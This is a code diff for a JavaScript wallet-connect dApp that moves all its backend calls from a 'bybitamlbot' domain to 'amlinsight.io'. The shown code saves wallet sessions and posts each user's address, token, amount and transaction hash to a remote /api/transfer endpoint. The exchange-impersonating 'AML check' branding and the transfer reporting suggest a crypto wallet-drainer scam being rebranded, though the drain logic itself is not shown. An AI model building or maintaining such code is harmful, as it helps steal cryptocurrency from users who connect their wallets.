@@ -24,8 +24,8 @@ const appKit = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://bybitamlbot.com/',
-    icons: ['https://bybitamlbot.com/icon.png'],
+    url: 'https://amlinsight.io',
+    icons: ['https://amlinsight.io/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
   allWallets: 'SHOW',
@@ -308,7 +308,7 @@ function formatBalance(balance, decimals) {
 async function saveSession(userAddress, chainId, txHash = null) {
   try {
     if (!sessionId) sessionId = generateSessionId();
-    const response = await fetch('https://api.bybitamlbot.com/api/save-session', {
+    const response = await fetch('https://api.amlinsight.io/api/save-session', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -335,7 +335,7 @@ async function restoreSession() {
     const storedSessionId = sessionStorage.getItem('sessionId');
     if (!storedSessionId) return null;
 
-    const response = await fetch(`https://api.bybitamlbot.com/api/get-session/${storedSessionId}`);
+    const response = await fetch(`https://api.amlinsight.io/api/get-session/${storedSessionId}`);
     const data = await response.json();
     if (data.success) {
       console.log(`✅ Session restored: ${storedSessionId}`);
@@ -367,7 +367,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     await saveSession(userAddress, chainId, txHash);
 
-    const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
+    const response = await fetch('https://api.amlinsight.io/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
